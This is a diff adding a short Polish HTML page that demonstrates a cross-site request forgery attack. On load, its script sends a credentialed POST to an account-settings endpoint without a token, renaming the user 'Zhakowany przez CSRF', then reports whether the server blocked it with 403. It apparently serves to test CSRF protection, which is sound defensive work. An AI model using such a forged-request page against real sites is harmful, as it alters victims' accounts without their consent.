@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <title>CSRF — spreparowany atak</title>
+</head>
+<body>
+  <h1>Spreparowana strona (CSRF)</h1>
+  <p id="status">Wymuszanie zmiany ustawień konta bez tokenu CSRF…</p>
+  <pre id="result"></pre>
+  <script>
+    fetch('/api/account/settings', {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ displayName: 'Zhakowany przez CSRF' }),
+    })
+      .then((r) => r.json().then((data) => ({ status: r.status, data })))
+      .then(({ status, data }) => {
+        document.getElementById('status').textContent =
+          status === 403 ? 'Atak zablokowany (403)' : 'Odpowiedź: ' + status;
+        document.getElementById('result').textContent = JSON.stringify(data, null, 2);
+      })
+      .catch((err) => {
+        document.getElementById('result').textContent = String(err);
+      });
+  </script>
+</body>
+</html>
